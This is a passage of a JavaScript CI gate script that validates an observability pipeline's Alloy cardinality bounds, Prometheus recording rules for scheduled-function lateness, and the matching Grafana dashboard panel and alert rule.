  'space, and a NARROWING to 40 hex would silently drop build_sha from 100% of production ' +
  'datapoints, because the client emits a 7-character short SHA (`git rev-parse --short HEAD`, ' +
  'client/src/observability/attributes.ts, mirrored in client/src/observability/names.ts). Do ' +
  "NOT apply the original slice brief's fixed-40-hex instruction — ADR-0190 D5 rejects it on " +
  'that evidence.';

/** Balanced `open`/`close` block starting at the first `open` at/after `from`. */
function delimitedBlock(text, from, open, close) {
  const start = text.indexOf(open, from);
  if (start === -1) return null;
  let depth = 0;
  for (let i = start; i < text.length; i++) {
    const ch = text[i];
    if (ch === '`') {
      const end = text.indexOf('`', i + 1);
      if (end === -1) return null;
      i = end;
      continue;
    }
    if (ch === '"') {
      const end = text.indexOf('"', i + 1);
      if (end === -1) return null;
      i = end;
      continue;
    }
    if (ch === open) depth++;
    else if (ch === close) {
      depth--;
      if (depth === 0) return { start, end: i, body: text.slice(start + 1, i) };
    }
  }
  return null;
}

/** Backtick-quoted list elements. null when ANY other token appears. */
function backtickListItems(body) {
  const items = [];
  let i = 0;
  while (i < body.length) {
    const ch = body[i];
    if (ch === ' ' || ch === '\t' || ch === '\n' || ch === '\r' || ch === ',') {
      i++;
      continue;
    }
    if (ch !== '`') return null;
    const end = body.indexOf('`', i + 1);
    if (end === -1) return null;
    items.push(body.slice(i + 1, end));
    i = end + 1;
  }
  return items;
}

function countOccurrences(text, needle) {
  let n = 0;
  let from = 0;
  for (;;) {
    const at = text.indexOf(needle, from);
    if (at === -1) return n;
    n++;
    from = at + needle.length;
  }
}

export function checkBuildShaBounded(alloyText) {
  // Whole-line `//` comments are blanked FIRST: a statement demoted to a
  // comment is not a statement, and a file-wide substring check cannot tell the
  // difference.
  const text = scrubCommentLines(alloyText);
  const headers = countOccurrences(text, S4_KEEP_HEADER);
  if (headers !== 1) {
    return fail(
      `G12e: found ${headers} \`${S4_KEEP_HEADER}\` component declarations; exactly 1 is ` +
        'required. This gate is PATH-SCOPED on purpose: the same statements moved verbatim into ' +
        'a second, unwired transform component keep every file-wide check green while the live ' +
        'pipeline loses the bound entirely.',
    );
  }
  const comp = delimitedBlock(text, text.indexOf(S4_KEEP_HEADER), '{', '}');
  if (comp === null) return fail(`G12e: \`${S4_KEEP_HEADER}\`'s block is unbalanced or absent`);
  const msAt = comp.body.indexOf('metric_statements');
  if (msAt === -1) {
    return fail(`G12e: \`${S4_KEEP_HEADER}\` declares no \`metric_statements\` block`);
  }
  if (countOccurrences(comp.body, 'metric_statements') !== 1) {
    return fail(`G12e: \`${S4_KEEP_HEADER}\` declares more than one \`metric_statements\` block`);
  }
  const ms = delimitedBlock(comp.body, msAt, '{', '}');
  if (ms === null) return fail("G12e: s4_keep's `metric_statements` block is unbalanced");
  const stAt = ms.body.indexOf('statements');
  if (stAt === -1) {
    return fail("G12e: s4_keep's `metric_statements` declares no `statements` list");
  }
  const eq = ms.body.indexOf('=', stAt);
  if (eq === -1) return fail("G12e: s4_keep's `statements` is not an assignment");
  const list = delimitedBlock(ms.body, eq, '[', ']');
  if (list === null) return fail("G12e: s4_keep's `statements = [` list is unbalanced or absent");
  if (ms.body.slice(eq + 1, list.start).trim().length > 0) {
    return fail('G12e: unreadable text between `statements =` and its `[` — fail loud');
  }
  const items = backtickListItems(list.body);
  if (items === null) {
    return fail(
      "G12e: s4_keep's `statements` list contains a token this scanner cannot read — fail loud " +
        'rather than compare against a partial parse',
    );
  }
  if (items.length === 0) {
    return fail("G12e: s4_keep's `statements` list is EMPTY — the S4 label bounds are gone");
  }

  if (items[0] !== S4_STATEMENT_KEEP_KEYS) {
    return fail(
      `G12e: the FIRST element of s4_keep's statements list is \`${items[0]}\`, expected ` +
        `\`${S4_STATEMENT_KEEP_KEYS}\`. The key allowlist must run FIRST: OTTL statements ` +
        'execute in order, so an attacker-chosen attribute name that is dropped later has ' +
        'already been read by every statement before it, and a key allowlist that never runs at ' +
        'all bounds nothing.',
    );
  }
  const required = [
    { name: 'zone_id', text: S4_STATEMENT_ZONE_ID },
    { name: 'build_sha', text: S4_STATEMENT_BUILD_SHA },
    { name: 'device_class', text: S4_STATEMENT_DEVICE_CLASS },
  ];
  for (const req of required) {
    if (items.includes(req.text)) continue;
    const prefix = `delete_key(attributes, "${req.name}")`;
    const drifted = items.find((s) => s.startsWith(prefix));
    const note = req.name === 'build_sha' ? ` ${BUILD_SHA_GRAMMAR_NOTE}` : '';
    return fail(
      `G12e: s4_keep's statements list does not carry the pinned \`${req.name}\` value bound ` +
        `character-for-character.${drifted === undefined ? ' It is ABSENT from THIS list (a copy in another component does not bound this pipeline).' : ` Found: \`${drifted}\`.`}` +
        ` Expected: \`${req.text}\`.${note}`,
    );
  }

  return pass(
    `G12e: s4_keep's own statements list carries the key allowlist as element [0] plus all ` +
      `${required.length} pinned value bounds, character-for-character (${items.length} ` +
      'statements total)',
  );
}

// ===========================================================================
// G13a-e — scheduled-function LATENESS (16r-e; measured against a live
// SpacetimeDB 2.8.1 /v1/metrics scrape)
//
// Structural model: like G9p, every compared number is DERIVED from a
// document already parsed for another reason (the recording rule's own
// selector, the alert's own evaluator, AlloyIngestStalled's own datasourceUid)
// rather than restated as a second, independently-maintained literal.
// ===========================================================================

/** The scheduled-function delay histogram (MEASURED: labels {db, function, le}). */
const SCHEDULED_FN_METRIC = 'spacetime_scheduled_function_delay_seconds_bucket';

/** The four scheduled functions this lateness ratio watches. SET, never a count. */
const SCHEDULED_FN_NAMES = [
  'movement_tick',
  'trade_offer_reaper',
  'pvp_deadline_reaper',
  'battle_challenge_reaper',
];

/** The over-edge selector's `le=` value: on-time means "at or under 50ms". */
const SCHEDULED_DELAY_OVER_EDGE = '0.05';

const SCHEDULED_STARTS_SERIES = 'mr:scheduled_function_starts:rate5m';
const SCHEDULED_ON_TIME_SERIES = 'mr:scheduled_function_on_time:rate5m';
const SCHEDULED_LATE_SERIES = 'mr:scheduled_function_late:ratio5m';

/**
 * G13d's lattice. MEASURED against a live SpacetimeDB 2.8.1 `/v1/metrics`
 * scrape (2026-08-22): the COMPLETE bucket edge list for
 * spacetime_scheduled_function_delay_seconds_bucket. There is NO 0.03 edge —
 * PromQL's `le="0.03"` matches nothing and records an empty series forever,
 * a defect the lattice check exists to catch instead of a restated literal
 * that a retune would have to remember to move too.
 */
const SCHEDULED_DELAY_BUCKET_EDGES = [
  '0.001',
  '0.005',
  '0.01',
  '0.05',
  '0.1',
  '0.5',
  '1',
  '5',
  '10',
  '30',
  '60',
  '300',
  '+Inf',
];

/**
 * The dashboard panel targeting `mr:scheduled_function_late:ratio5m`. Fail-loud
 * on JSON parse errors and on a missing `panels` array — a dashboard document
 * that does not parse is never green.
 */
function schedulerPanel(dashboardJsonText) {
  let dash;
  try {
    dash = JSON.parse(dashboardJsonText);
  } catch (err) {
    return fail(`monster-realm.json does not parse as JSON: ${err.message}`);
  }
  if (dash === null || typeof dash !== 'object' || !Array.isArray(dash.panels)) {
    return fail('the dashboard document has no `panels` array');
  }
  if (dash.panels.length === 0) {
    return fail('the dashboard declares ZERO panels — nothing was scanned');
  }
  const matches = dash.panels.filter(
    (p) => Array.isArray(p?.targets) && p.targets.some((t) => t?.expr === SCHEDULED_LATE_SERIES),
  );
  if (matches.length !== 1) {
    return fail(
      `found ${matches.length} panels with a target querying \`${SCHEDULED_LATE_SERIES}\`; ` +
        'exactly 1 is required',
    );
  }
  return { ok: true, panel: matches[0], allPanels: dash.panels };
}

/** Axis-aligned `{x0,y0,x1,y1}` box from a Grafana `gridPos`. null if unreadable. */
function gridBox(gridPos) {
  if (gridPos === null || typeof gridPos !== 'object') return null;
  const { h, w, x, y } = gridPos;
  if (![h, w, x, y].every((n) => typeof n === 'number' && Number.isFinite(n))) return null;
  return { x0: x, y0: y, x1: x + w, y1: y + h };
}

/** Standard axis-aligned rectangle overlap (strict — edge-touching is NOT an overlap). */
function boxesOverlap(a, b) {
  return a.x0 < b.x1 && b.x0 < a.x1 && a.y0 < b.y1 && b.y0 < a.y1;
}

/**
 * Every `spacetime_scheduled_function_delay_seconds_bucket{...}` selector body
 * in a PromQL-bearing text, in order of appearance. null on an unbalanced
 * brace (fail loud rather than a partial parse).
 */
function scheduledFnSelectors(expr) {
  const selectors = [];
  let from = 0;
  for (;;) {
    const at = expr.indexOf(SCHEDULED_FN_METRIC, from);
    if (at === -1) break;
    const afterMetric = at + SCHEDULED_FN_METRIC.length;
    const block = delimitedBlock(expr, afterMetric, '{', '}');
    if (block === null || block.start !== afterMetric) return null;
    selectors.push({ body: block.body });
    from = block.end + 1;
  }
  return selectors;
}

/** The `function=~"a|b|c"` alternation, split to names. null if absent. */
function parseFunctionMatcher(selectorBody) {
  const needle = 'function=~"';
  const at = selectorBody.indexOf(needle);
  if (at === -1) return null;
  const start = at + needle.length;
  const end = selectorBody.indexOf('"', start);
  if (end === -1) return null;
  const names = selectorBody
    .slice(start, end)
    .split('|')
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
  return names.length === 0 ? null : names;
}

/**
 * Every recording rule in recording.rules.yml, COMMENT-STRIPPED so a
 * commented-out decoy is not counted, as `{ name, expr, groupName }`. The
 * `expr:` block-scalar form (`expr: |` + an indented body) and the rare
 * inline scalar form are both read; the block form's body lines are joined
 * with a single space, never concatenated raw (a PromQL expression that
 * happens to wrap is still ONE expression).
 */
function parseRecordingGroups(recordingRulesText) {
  const lines = stripHashComments(recordingRulesText).split('\n');
  const roots = [];
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].startsWith('groups:')) roots.push(i);
  }
  if (roots.length !== 1) {
    return fail(`expected exactly one column-0 \`groups:\` key, found ${roots.length}`);
  }
  const groups = listItems(subBlock(lines, roots[0]));
  if (groups.length === 0) return fail('`groups:` declares zero groups — nothing was scanned');

  const rules = [];
  for (const group of groups) {
    const gi = indentOf(group[0]);
    const groupName = scopedScalar(group, 'name', gi, 'a recording-rule group');
    if (!groupName.ok) return groupName;
    const rulesBlock = scopedBlock(group, 'rules', gi, `recording group \`${groupName.value}\``);
    if (!rulesBlock.ok) return rulesBlock;
    for (const item of listItems(rulesBlock.lines)) {
      const ri = indentOf(item[0]);
      if (!item[0].trim().startsWith('record:')) continue;
      const name = scalarOf(item[0], 'record');
      const exprIdx = keyIndices(item, 'expr', ri);
      if (exprIdx.length !== 1) {
        return fail(
          `recording rule \`${name}\` in group \`${groupName.value}\` declares ` +
            `${exprIdx.length} \`expr:\` keys, need 1`,
        );
      }
      const inline = scalarOf(item[exprIdx[0]], 'expr');
      let expr;
      if (inline.length > 0 && inline !== '|') {
        expr = inline;
      } else {
        const body = subBlock(item, exprIdx[0])
          .map((l) => l.trim())
          .filter((l) => l.length > 0);
        if (body.length === 0) {
          return fail(`recording rule \`${name}\`'s \`expr: |\` block is empty`);
        }
        expr = body.join(' ');
      }
      rules.push({ name, expr, groupName: groupName.value });
    }
  }
  if (rules.length === 0) return fail('zero recording rules were parsed — nothing was scanned');
  return { ok: true, rules, detail: `${rules.length} recording rule(s) parsed` };
}

/**
 * G13a — the mr-scheduler recording-rule group. Every compared name set is
 * derived from the selectors themselves; the only literal restated here is
 * the expected 4-name allowlist, which is the SSOT this gate exists to guard.
 */
export function checkSchedulerRecordingRules(recordingRulesText) {
  const parsed = parseRecordingGroups(recordingRulesText);
  if (!parsed.ok) return fail(`G13a: ${parsed.detail}`);

  // Round 3 (Gap 4) — RECORD-NAME UNIQUENESS, asserted BEFORE anything resolves a
  // series by name. Prometheus does not statically forbid two `record:` rules
  // emitting the SAME output series, and `promtool check rules` accepts it:
  // measured, a decoy group re-recording `mr:scheduled_function_starts:rate5m`
  // as `vector(0)` passed both this eval and the real dockerized promtool. Two
  // rules writing one series is a silent, order-dependent override at eval time.
  // This clause runs FIRST because every by-name lookup below (and
  // `rateWindowSeconds`' own `.find`) is first-wins: without it, a decoy placed
  // ahead of the real group makes a later clause fail for the WRONG reason.
  for (const seriesName of [
    SCHEDULED_STARTS_SERIES,
    SCHEDULED_ON_TIME_SERIES,
    SCHEDULED_LATE_SERIES,
  ]) {
    const named = parsed.rules.filter((r) => r.name === seriesName);
    if (named.length > 1) {
      return fail(
        `G13a: ${named.length} recording rules emit the series \`${seriesName}\` — Prometheus ` +
          'accepts duplicate `record:` names (promtool does not reject them), so the winner is ' +
          'an order-dependent override and every by-name lookup in this gate is first-wins',
      );
    }
  }

  const withMetric = parsed.rules.filter((r) => r.expr.includes(SCHEDULED_FN_METRIC));
  if (withMetric.length === 0) {
    return fail(
      `G13a: no recording rule references \`${SCHEDULED_FN_METRIC}\` — the mr-scheduler ` +
        'lateness recording group has not landed (or was commented out; stripHashComments runs ' +
        'before this gate parses, so a `#`-prefixed rule is invisible, exactly as it must be)',
    );
  }

  const expectedSet = [...SCHEDULED_FN_NAMES].sort().join('|');
  const infRules = [];
  const edgeRules = [];
  for (const rule of withMetric) {
    const selectors = scheduledFnSelectors(rule.expr);
    if (selectors === null || selectors.length === 0) {
      return fail(
        `G13a: rule \`${rule.name}\`'s expr mentions \`${SCHEDULED_FN_METRIC}\` but its selector ` +
          'braces are unbalanced or absent — fail loud rather than a partial parse',
      );
    }
    for (const sel of selectors) {
      if (sel.body.includes('reducer=')) {
        return fail(
          `G13a: rule \`${rule.name}\` selects \`${SCHEDULED_FN_METRIC}\` with a \`reducer=\` ` +
            "matcher. This metric family's per-invocation label is `function`, MEASURED against a " +
            'live SpacetimeDB 2.8.1 /v1/metrics scrape — `reducer` is not a label on it at all, ' +
            'and PromQL silently matches NOTHING on a non-existent label key, recording an EMPTY ' +
            'series forever rather than failing loud.',
        );
      }
      if (sel.body.includes(`le="+Inf"`)) infRules.push({ rule, sel });
      if (sel.body.includes(`le="${SCHEDULED_DELAY_OVER_EDGE}"`)) edgeRules.push({ rule, sel });
    }
  }

  if (infRules.length !== 1) {
    return fail(
      `G13a: found ${infRules.length} recording-rule selectors on \`${SCHEDULED_FN_METRIC}\` ` +
        'with `le="+Inf"`; exactly 1 (the starts/denominator series) is required',
    );
  }
  if (edgeRules.length !== 1) {
    return fail(
      `G13a: found ${edgeRules.length} recording-rule selectors on \`${SCHEDULED_FN_METRIC}\` ` +
        `with \`le="${SCHEDULED_DELAY_OVER_EDGE}"\`; exactly 1 (the on-time/numerator series) is ` +
        'required',
    );
  }

  const infNames = parseFunctionMatcher(infRules[0].sel.body);
  const edgeNames = parseFunctionMatcher(edgeRules[0].sel.body);
  if (infNames === null || edgeNames === null) {
    return fail(
      'G13a: a scheduled-function selector has no `function=~"..."` matcher to read names from',
    );
  }
  if ([...infNames].sort().join('|') !== expectedSet) {
    return fail(
      `G13a: the \`le="+Inf"\` selector's function set is [${infNames.join(', ')}], expected ` +
        `EXACTLY [${SCHEDULED_FN_NAMES.join(', ')}] — a SET comparison, never a count: a ` +
        'substitution keeps the count identical',
    );
  }
  if ([...edgeNames].sort().join('|') !== expectedSet) {
    return fail(
      `G13a: the \`le="${SCHEDULED_DELAY_OVER_EDGE}"\` selector's function set is ` +
        `[${edgeNames.join(', ')}], expected EXACTLY [${SCHEDULED_FN_NAMES.join(', ')}]`,
    );
  }
  if ([...infNames].sort().join('|') !== [...edgeNames].sort().join('|')) {
    return fail(
      `G13a: the numerator and denominator selectors carry DIFFERENT function sets ` +
        `([${edgeNames.join(', ')}] vs [${infNames.join(', ')}]) — a drift here is silent and ` +
        'fatal: each recorded series would rate() a different subset of scheduled functions',
    );
  }

  const infGroups = promByClauses(infRules[0].rule.expr);
  if (infGroups === null || !infGroups.some((g) => g.length === 1 && g[0] === 'function')) {
    return fail(
      `G13a: rule \`${infRules[0].rule.name}\` does not aggregate \`sum by (function)\` — found ` +
        `groupings [${infGroups ? infGroups.map((g) => `(${g.join(',')})`).join(', ') : 'none'}]`,
    );
  }
  const edgeGroups = promByClauses(edgeRules[0].rule.expr);
  if (edgeGroups === null || !edgeGroups.some((g) => g.length === 1 && g[0] === 'function')) {
    return fail(`G13a: rule \`${edgeRules[0].rule.name}\` does not aggregate \`sum by (function)\``);
  }

  const ratioRules = parsed.rules.filter((r) => r.name === SCHEDULED_LATE_SERIES);
  if (ratioRules.length !== 1) {
    return fail(
      `G13a: found ${ratioRules.length} recording rules named \`${SCHEDULED_LATE_SERIES}\`; ` +
        'exactly 1 is required',
    );
  }
  const ratio = ratioRules[0];
  if (
    !ratio.expr.includes(SCHEDULED_ON_TIME_SERIES) ||
    !ratio.expr.includes(SCHEDULED_STARTS_SERIES)
  ) {
    return fail(
      `G13a: rule \`${SCHEDULED_LATE_SERIES}\` does not reference BOTH ` +
        `\`${SCHEDULED_ON_TIME_SERIES}\` and \`${SCHEDULED_STARTS_SERIES}\` — it must DERIVE the ` +
        'ratio from the two recorded series, never compute something else',
    );
  }
  if (ratio.expr.includes('function=~')) {
    return fail(
      `G13a: rule \`${SCHEDULED_LATE_SERIES}\` inlines its own \`function=~\` matcher — the ` +
        'allowlist must appear EXACTLY TWICE in this file (the numerator and denominator ' +
        'selectors), never a third, independently-maintained copy inside the ratio',
    );
  }

  const matcherOccurrences = countOccurrences(stripHashComments(recordingRulesText), 'function=~"');
  if (matcherOccurrences !== 2) {
    return fail(
      `G13a: \`function=~"\` appears ${matcherOccurrences} time(s) in recording.rules.yml; ` +
        'exactly 2 (the starts and on-time selectors) is required — a third copy is a restated ' +
        'allowlist the ratio rule was supposed to derive from, not repeat',
    );
  }

  // Round 3 (Gap 1) — STRUCTURAL WHITELIST on each expr, not a denylist of
  // neutering tokens. Measured bypasses that passed every clause above:
  //   ratio   -> `clamp_max(1 - (on_time / starts), 0)`  (pins <=0: NEVER fires)
  //   on_time -> `sum by (function) (rate(...[5m])) * 0`  (pins 0: ALWAYS fires)
  // Both keep every gated token — the metric name, the matcher, the `sum by
  // (function)`, the rate window — and change only the ARITHMETIC, which no
  // token-level check can see. A denylist of `clamp_max(`/`* 0`/`or vector(0)`/
  // `offset`/`and on()` is the wrong shape: this repo's own recorded finding is
  // that abort-construct blacklists are unclosable, 16 CI-clean bypasses beat
  // one list. So this asserts the WHOLE normalised expr equals a template
  // REBUILT FROM THE RULE'S OWN PARTS (its metric, its selector body, its
  // window) — nothing may exist outside it. The names and the `le=` value are
  // taken from the rule itself, so this clause adds no third copy of either.
  const normalise = (text) => text.replace(/\s+/g, ' ').trim();
  for (const { rule, sel } of [infRules[0], edgeRules[0]]) {
    if (!rule.expr.includes('[5m]')) {
      return fail(
        `G13a: rule \`${rule.name}\` declares no \`[5m]\` rate window — the alert's \`for:\` is ` +
          'derived from that window, so it must be readable here',
      );
    }
    const expected = `sum by (function) (rate(${SCHEDULED_FN_METRIC}{${sel.body}}[5m]))`;
    if (normalise(rule.expr) !== normalise(expected)) {
      return fail(
        `G13a: rule \`${rule.name}\` computes something other than a bare windowed rate of its ` +
          `own selector.\n  expected: ${normalise(expected)}\n  actual:   ${normalise(rule.expr)}\n` +
          'Anything outside that template — `* 0`, `clamp_max(...)`, `or vector(0)`, `offset` — ' +
          'silently pins the ratio and makes the alert un-fireable or permanently firing while ' +
          'every token-level check above stays green.',
      );
    }
  }
  const expectedRatio = `1 - (${SCHEDULED_ON_TIME_SERIES} / ${SCHEDULED_STARTS_SERIES})`;
  if (normalise(ratio.expr) !== normalise(expectedRatio)) {
    return fail(
      `G13a: rule \`${SCHEDULED_LATE_SERIES}\` is not the bare over-edge ratio.\n  expected: ` +
        `${normalise(expectedRatio)}\n  actual:   ${normalise(ratio.expr)}\n` +
        'A wrapper such as `clamp_max(..., 0)` keeps every referenced series intact while pinning ' +
        'the recorded value, so the `gt` alert can never fire.',
    );
  }

  return pass(
    `G13a: exactly one +Inf and one le="${SCHEDULED_DELAY_OVER_EDGE}" selector on ` +
      `\`${SCHEDULED_FN_METRIC}\`, both \`sum by (function)\` over the SAME 4-name set ` +
      `[${SCHEDULED_FN_NAMES.join(', ')}], and \`${ratio.name}\` derives from both without a ` +
      'third `function=~` matcher',
  );
}

/**
 * The scheduler's own alert rule (identified by its expr referencing the
 * ratio series), parsed via the SAME `parseAlertingRules` G9p uses.
 */
function schedulerAlertRule(alertRulesText) {
  const parsed = parseAlertingRules(alertRulesText);
  if (!parsed.ok) return fail(parsed.detail);
  const matches = parsed.rules.filter((r) => r.exprs.some((e) => e.includes(SCHEDULED_LATE_SERIES)));
  if (matches.length !== 1) {
    return fail(
      `found ${matches.length} alert rules whose \`expr:\` references \`${SCHEDULED_LATE_SERIES}\`; ` +
        'exactly 1 is required',
    );
  }
  return { ok: true, rule: matches[0], allRules: parsed.rules };
}

/**
 * The scheduler alert's own `gt` evaluator param, as a NUMBER — the value
 * G13b/G13d compare the panel's threshold step against, DERIVED here rather
 * than restated in either of them.
 */
function schedulerAlertEvaluatorParam(alertRulesText) {
  const found = schedulerAlertRule(alertRulesText);
  if (!found.ok) return found;
  const rule = found.rule;
  if (rule.condition === null) return fail(`rule \`${rule.uid}\` declares no \`condition:\``);
  const node = rule.data.find((d) => d.refId === rule.condition);
  if (node === undefined) {
    return fail(
      `rule \`${rule.uid}\` names \`condition: ${rule.condition}\` but no \`data:\` entry ` +
        'declares that refId — a DANGLING condition refId',
    );
  }
  const shape = thresholdShape(node, rule.uid);
  if (!shape.ok) return fail(shape.detail);
  if (shape.params.length !== 1) {
    return fail(`rule \`${rule.uid}\`'s evaluator declares ${shape.params.length} params, need 1`);
  }
  const value = Number(shape.params[0]);
  if (!Number.isFinite(value)) {
    return fail(`rule \`${rule.uid}\`'s evaluator param \`${shape.params[0]}\` is not a number`);
  }
  return { ok: true, value, rawValue: shape.params[0], rule };
}

/**
 * G13b — the dashboard panel. The threshold step's expected VALUE is read
 * from the alert's own evaluator param (schedulerAlertEvaluatorParam), never
 * restated as a second literal.
 */
export function checkSchedulerLatencyPanel(dashboardJsonText, alertRulesText) {
  const panelRes = schedulerPanel(dashboardJsonText);
  if (!panelRes.ok) return fail(`G13b: ${panelRes.detail}`);
  const panel = panelRes.panel;

  const ids = panelRes.allPanels.map((p) => p?.id);
  const sameId = ids.filter((id) => id === panel.id);
  if (typeof panel.id !== 'number' || sameId.length !== 1) {
    return fail(
      `G13b: the scheduler-lateness panel's \`id\` (${JSON.stringify(panel.id)}) is not unique ` +
        `across ${panelRes.allPanels.length} panels (${sameId.length} panels share it)`,
    );
  }

  const box = gridBox(panel.gridPos);
  if (box === null) {
    return fail("G13b: the scheduler-lateness panel has no readable `gridPos` rectangle");
  }
  for (const other of panelRes.allPanels) {
    if (other === panel) continue;
    const otherBox = gridBox(other?.gridPos);
    if (otherBox === null) continue;
    if (boxesOverlap(box, otherBox)) {
      return fail(
        `G13b: the scheduler-lateness panel's gridPos ${JSON.stringify(panel.gridPos)} OVERLAPS ` +
          `panel id ${JSON.stringify(other?.id)}'s ${JSON.stringify(other?.gridPos)} — ` +
          'checkDashboardPanelsReal cannot see a layout overlap, and a stacked panel renders ' +
          'broken with green CI',
      );
    }
  }

  const target = panel.targets.find((t) => t?.expr === SCHEDULED_LATE_SERIES);
  if (typeof target?.legendFormat !== 'string' || !target.legendFormat.includes('{{function}}')) {
    return fail(
      `G13b: the scheduler-lateness panel's target \`legendFormat\` is ` +
        `${JSON.stringify(target?.legendFormat ?? null)}, expected it to contain \`{{function}}\` ` +
        '— the series is grouped BY function, and an unlabelled legend collapses four lines into one',
    );
  }

  const unit = panel?.fieldConfig?.defaults?.unit;
  if (unit !== 'percentunit') {
    return fail(
      `G13b: the scheduler-lateness panel's \`fieldConfig.defaults.unit\` is ` +
        `${JSON.stringify(unit ?? null)}, expected \`percentunit\` — the series is a RATIO ` +
        '(late/total), not a duration',
    );
  }

  const alertParam = schedulerAlertEvaluatorParam(alertRulesText);
  if (!alertParam.ok) return fail(`G13b: ${alertParam.detail}`);

  const steps = panel?.fieldConfig?.defaults?.thresholds?.steps;
  if (!Array.isArray(steps) || steps.length === 0) {
    return fail('G13b: the scheduler-lateness panel declares no `thresholds.steps`');
  }
  const matchingStep = steps.filter((s) => s?.value === alertParam.value);
  if (matchingStep.length !== 1) {
    return fail(
      `G13b: the panel's \`thresholds.steps\` values are ` +
        `[${steps.map((s) => s?.value).join(', ')}]; exactly 1 must equal the alert's own ` +
        `evaluator param (${alertParam.value}), READ FROM rules.yml — a restated literal here is ` +
        'exactly what silently drifts from the alert',
    );
  }

  return pass(
    `G13b: exactly one panel (id ${panel.id}) targets \`${SCHEDULED_LATE_SERIES}\`, gridPos ` +
      'disjoint from every other panel, legendFormat carries {{function}}, unit percentunit, and ' +
      `a threshold step equal to the alert's own evaluator param (${alertParam.value})`,
  );
}

/**
 * The `[<duration>]` PromQL rate window of a NAMED recording rule, DERIVED
 * rather than restated — G13c's debounce floor comes from here.
 */
function rateWindowSeconds(recordingRulesText, seriesName) {
  const parsed = parseRecordingGroups(recordingRulesText);
  if (!parsed.ok) return fail(parsed.detail);
  const rule = parsed.rules.find((r) => r.name === seriesName);
  if (rule === undefined) return fail(`no recording rule named \`${seriesName}\` was parsed`);
  const open = rule.expr.lastIndexOf('[');
  const close = rule.expr.indexOf(']', open);
  if (open === -1 || close === -1) {
    return fail(`rule \`${seriesName}\`'s expr has no \`[<duration>]\` rate window to derive from`);
  }
  const raw = rule.expr.slice(open + 1, close);
  const seconds = parseDurationSeconds(raw);
  if (seconds === null || seconds === 0) {
    return fail(
      `rule \`${seriesName}\`'s rate window \`[${raw}]\` does not parse as a non-zero duration`,
    );
  }
  return { ok: true, seconds, raw };
}

/**
 * G13c — the alert rule itself. Every derived value is READ, never re-spelled:
 * the query datasource comes from AlloyIngestStalled's own entry, and the
 * debounce floor comes from the recorded series' own `[5m]` rate window.
 */
export function checkSchedulerAlertRule(alertRulesText, recordingRulesText) {
  const parsed = parseAlertingRules(alertRulesText);
  if (!parsed.ok) return fail(`G13c: ${parsed.detail}`);

  const matches = parsed.rules.filter((r) => r.exprs.some((e) => e.includes(SCHEDULED_LATE_SERIES)));
  if (matches.length !== 1) {
    return fail(
      `G13c: found ${matches.length} alert rules whose \`expr:\` references ` +
        `\`${SCHEDULED_LATE_SERIES}\`; exactly 1 is required`,
    );
  }
  const rule = matches[0];

  const dupUid = parsed.rules.filter((r) => r.uid === rule.uid);
  if (dupUid.length !== 1) {
    return fail(
      `G13c: uid \`${rule.uid}\` is shared by ${dupUid.length} rules — Grafana keys provisioned ` +
        'rules by uid, so a duplicate silently REPLACES one',
    );
  }

  if (rule.severity !== 'warning') {
    return fail(
      `G13c: rule \`${rule.uid}\` declares \`severity: ${rule.severity ?? '(none)'}\`, expected ` +
        '`warning`',
    );
  }
  if (rule.isPaused !== null && rule.isPaused !== 'false') {
    return fail(
      `G13c: rule \`${rule.uid}\` declares \`isPaused: ${rule.isPaused}\` — a paused rule is ` +
        'provisioned but never evaluated',
    );
  }

  if (rule.condition === null) return fail(`G13c: rule \`${rule.uid}\` declares no \`condition:\``);
  const node = rule.data.find((d) => d.refId === rule.condition);
  if (node === undefined) {
    return fail(
      `G13c: rule \`${rule.uid}\` names \`condition: ${rule.condition}\` but no \`data:\` entry ` +
        'declares that refId — a DANGLING condition refId is the quietest failure in this file',
    );
  }

  const shape = thresholdShape(node, rule.uid);
  if (!shape.ok) return fail(`G13c: ${shape.detail}`);
  if (shape.nodeType !== 'threshold') {
    return fail(
      `G13c: rule \`${rule.uid}\`'s condition node is \`type: ${shape.nodeType}\`, expected ` +
        '`threshold`',
    );
  }
  if (shape.evaluatorType !== 'gt') {
    return fail(
      `G13c: rule \`${rule.uid}\`'s evaluator is \`type: ${shape.evaluatorType}\`, expected ` +
        '`gt` — a delay alert that fires when LATENESS IS LOW is inverted',
    );
  }
  if (shape.params.length !== 1) {
    return fail(
      `G13c: rule \`${rule.uid}\`'s evaluator declares ${shape.params.length} params, need 1`,
    );
  }

  // Round 3 (Gap 2) — the threshold node's OWN `expression:` must resolve to the
  // `data:` entry that actually carries the ratio query. `condition:` and
  // `expression:` are two SEPARATE references and only the first was checked
  // above: measured, rewriting `expression: A` to `expression: ZZ` (a refId
  // declared nowhere) left every clause green while the rule errors on every
  // evaluation in real Grafana — structurally dead, gate-green. G9p already
  // makes exactly this assertion for AlloyDown (`alloyShape.expression !==
  // alloyExprEntry.refId`); this is that same clause, not a new idea.
  const queryEntry = rule.data.find(
    (d) => typeof d.expr === 'string' && d.expr.includes(SCHEDULED_LATE_SERIES),
  );
  if (queryEntry === undefined) {
    return fail(
      `G13c: rule \`${rule.uid}\` has no \`data:\` entry whose \`expr:\` queries ` +
        `\`${SCHEDULED_LATE_SERIES}\``,
    );
  }
  if (shape.expression !== queryEntry.refId) {
    return fail(
      `G13c: rule \`${rule.uid}\`'s threshold node reads \`expression: ${shape.expression}\` but ` +
        `the entry carrying the \`${SCHEDULED_LATE_SERIES}\` query is refId ` +
        `\`${queryEntry.refId}\`. A threshold pointed at a refId that does not carry the query ` +
        'either errors on every evaluation or silently thresholds a different series.',
    );
  }

  const stalled = parsed.rules.find((r) => r.uid === 'mr-alloy-ingest-stalled');
  if (stalled === undefined) {
    return fail(
      'G13c: no `mr-alloy-ingest-stalled` rule was parsed to DERIVE the expected datasourceUid from',
    );
  }
  const stalledExprEntry = stalled.data.find((d) => d.expr !== null);
  const ruleExprEntry = rule.data.find(
    (d) => d.expr !== null && d.expr.includes(SCHEDULED_LATE_SERIES),
  );
  if (stalledExprEntry === undefined || ruleExprEntry === undefined) {
    return fail("G13c: could not resolve the query entry carrying either rule's expr");
  }
  if (ruleExprEntry.datasourceUid !== stalledExprEntry.datasourceUid) {
    return fail(
      `G13c: rule \`${rule.uid}\` queries datasource \`${ruleExprEntry.datasourceUid}\`, expected ` +
        `AlloyIngestStalled's \`${stalledExprEntry.datasourceUid}\` — read from that rule, not ` +
        'restated here',
    );
  }

  const noDataIdx = keyIndices(rule.lines, 'noDataState', rule.indent);
